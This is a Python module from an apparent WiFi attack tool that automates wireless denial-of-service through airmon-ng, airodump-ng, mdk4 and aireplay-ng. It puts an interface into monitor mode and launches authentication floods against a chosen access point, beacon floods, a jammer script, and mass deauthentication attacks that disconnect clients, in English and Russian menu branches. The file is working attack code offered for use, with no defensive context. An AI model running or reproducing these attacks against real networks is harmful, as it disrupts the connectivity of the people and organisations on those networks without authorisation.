#Coded by ANOI

#Imports
from core.color import color
from time import sleep
import subprocess
import readline
import sys
import os

readline.add_history
line = '----------------------------------'
linec = '####################################'

def return_module(module, detect):
    if detect == True:
        print(color.RED+'\n[*] Detected (CTRL + C)')
        print(color.YELLOW+'[*] The return of the module',end='',flush=True)
        print('.',end='',flush=True)
        com_1 = 'sudo airmon-ng stop {}mon'.format(module.replace('mon', ''))
        print('.',end='',flush=True)
        subprocess.Popen(com_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        print('.',end='',flush=True)
        print(color.GREEN+'Done')
        print(color.RED+'[-] Exit')
        sys.exit()
    else:
        print(color.YELLOW+'[*] The return of the module',end='',flush=True)
        print('.',end='',flush=True)
        com_1 = 'sudo airmon-ng stop {}mon'.format(module.replace('mon', ''))
        print('.',end='',flush=True)
        subprocess.Popen(com_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        print('.',end='',flush=True)
        print(color.GREEN+'Done')
        print(color.RED+'[-] Exit')
        sys.exit()

def start_module(module):
    module = module.replace('mon', '')
    com_1 = 'sudo airmon-ng stop {}mon'.format(module)
    com_2 = 'sudo airmon-ng start {}'.format(module)
    subprocess.Popen(com_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    subprocess.Popen(com_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

def attack(lang, module, numofattack, homedir):
    if lang == 'ENGLISH':
        os.system('clear')
        print(color.GREEN+linec)
        if numofattack == 1:
            try:
                
                start_module(module)
                print(color.YELLOW+'\n\tOpen new terminal? (y/n)')
                y_n = input(color.CYAN+color.UNDERL+'WKBYE'+color.ENDC+' > ')
                if y_n == 'y' or y_n == 'Y' or y_n == 'yes' or y_n == 'Yes':
                    com_1 = 'xterm -e sudo airodump-ng {}mon &'.format(module.replace('mon', ''))
                elif y_n == 'n' or y_n == 'N' or y_n == 'No' or y_n == 'no':
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))
                else:
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))

                os.system(com_1)
                bssid = input(color.GREEN+'BSSID > ')
                com_5 = 'sudo killall xterm'
                os.system(com_5)
                com_4 = 'sudo mdk4 {}mon a -a {}'.format(module.replace('mon', ''), bssid)
                os.system(com_4)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)

            return_module(module, detect=False)

        elif numofattack == 2:
            try:
                start_module(module)
                com_1 = 'sudo mdk4 {}mon b -ams 500'.format(module.replace('mon', ''))
                os.system(com_1)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)

            return_module(module, detect=False)
        
        elif numofattack == 3:
            try:
                start_module(module)
                com_1 = 'sudo {}/lib/./wifijummer.py -i {}mon'.format(homedir,module.replace('mon', ''))
                os.system(com_1)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)
            
            return_module(module, detect=False)

        elif numofattack == 4:
            try:
                start_module(module)
                print(color.YELLOW+'\n\tOpen new terminal? (y/n)')
                y_n = input(color.CYAN+color.UNDERL+'WKBYE'+color.ENDC+' > ')
                if y_n == 'y' or y_n == 'Y' or y_n == 'yes' or y_n == 'Yes':
                    com_1 = 'xterm -e sudo airodump-ng {}mon &'.format(module.replace('mon', ''))
                elif y_n == 'n' or y_n == 'N' or y_n == 'No' or y_n == 'no':
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))
                else:
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))

                os.system(com_1)
                bssid = input(color.GREEN+'BSSID > ')
                com_5 = 'sudo killall xterm'
                os.system(com_5)           
                com_2 = 'sudo mdk4 {}mon d -B {}'.format(module.replace('mon', ''), bssid)
                os.system(com_2)
                input()
            except KeyboardInterrupt:
                return_module(module,detect=True)
            
            return_module(module, detect=False)

        elif numofattack == 5:
            try:
                start_module(module)
                print(color.YELLOW+'\n\tOpen new terminal? (y/n)')
                y_n = input(color.CYAN+color.UNDERL+'WKBYE'+color.ENDC+' > ')
                if y_n == 'y' or y_n == 'Y' or y_n == 'yes' or y_n == 'Yes':
                    com_1 = 'xterm -e sudo airodump-ng {}mon &'.format(module.replace('mon', ''))
                elif y_n == 'n' or y_n == 'N' or y_n == 'No' or y_n == 'no':
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))
                else:
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))

                os.system(com_1)
                bssid = input(color.GREEN+'BSSID > ')
                chn = input('Channel > ')
                com_5 = 'sudo killall xterm'
                os.system(com_5)
                com_3 = 'sudo iwconfig {}mon channel {}'.format(module.replace('mon', ''),chn)
                os.system(com_3)
                com_2 = 'sudo aireplay-ng -0 999999 -a {} {}mon'.format(bssid, module.replace('mon',''))
                os.system(com_2)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)
            
            return_module(module, detect=False)
    elif lang == 'RUSSIAN':
        os.system('clear')
        print(color.GREEN+linec)
        if numofattack == 1:
            try:
                start_module(module)
                com_3 = 'sudo airodump-ng {}mon'.format(module.replace('mon', ''))
                os.system(com_3)
                os.system('clear')
                print(color.GREEN+linec)
                bssid = input('BSSID > ')
                com_4 = 'sudo mdk4 {}mon a -a {}'.format(module.replace('mon', ''), bssid)
                os.system(com_4)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)

            return_module(module, detect=False)

        elif numofattack == 2:
            try:
                start_module(module)
                com_1 = 'sudo mdk4 {}mon b -ams 500'.format(module.replace('mon', ''))
                os.system(com_1)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)

            return_module(module, detect=False)
        
        elif numofattack == 3:
            try:
                start_module(module)
                com_1 = 'sudo {}/lib/./wifijummer.py -i {}mon'.format(homedir,module.replace('mon', ''))
                os.system(com_1)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)
            
            return_module(module, detect=False)

        elif numofattack == 4:
            try:
                start_module(module)
                com_1 = 'sudo mdk4 {}mon d'.format(module.replace('mon', ''))
                os.system(com_1)
                input()
            except KeyboardInterrupt:
                return_module(module,detect=True)
            
            return_module(module, detect=False)

        elif numofattack == 5:
            try:
                start_module(module)
                print(color.YELLOW+'\n\tОткрыть новый терминал? (y/n)')
                y_n = input(color.CYAN+color.UNDERL+'WKBYE'+color.ENDC+' > ')
                if y_n == 'y' or y_n == 'Y' or y_n == 'yes' or y_n == 'Yes':
                    com_1 = 'xterm -e sudo airodump-ng {}mon &'.format(module.replace('mon', ''))
                elif y_n == 'n' or y_n == 'N' or y_n == 'No' or y_n == 'no':
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))
                else:
                    com_1 = 'sudo airodump-ng {}mon'.format(module.replace('mon',''))

                os.system(com_1)
                bssid = input(color.GREEN+'BSSID > ')
                chn = input('Channel > ')
                com_3 = 'sudo iwconfig {}mon channel {}'.format(module.replace('mon', ''),chn)
                os.system(com_3)
                com_2 = 'sudo aireplay-ng -0 999999 -a {} {}mon'.format(bssid, module.replace('mon',''))
                os.system(com_2)
                input()
            except KeyboardInterrupt:
                return_module(module, detect=True)
            
            return_module(module, detect=False)    